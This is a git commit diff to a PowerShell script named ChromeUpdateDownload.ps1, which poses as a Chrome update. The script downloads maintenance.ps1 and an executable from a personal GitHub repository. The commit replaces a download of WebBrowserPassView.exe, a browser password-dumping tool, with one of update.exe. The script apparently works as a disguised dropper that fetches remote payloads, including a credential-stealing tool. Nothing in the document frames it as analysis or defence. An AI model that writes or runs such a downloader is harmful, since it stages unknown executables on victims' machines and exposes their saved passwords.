5953f98db7074c51feebe407f7c5ab889b719a49
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-21 17:32:03 +0700

    Back to update.exe

--- ChromeUpdateDownload.ps1
+++ ChromeUpdateDownload.ps1
@@ -1,2 +1,2 @@
 wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/maintenance.ps1 -OutFile maintenance.ps1
-wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe
+wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/update.exe -OutFile update.exe
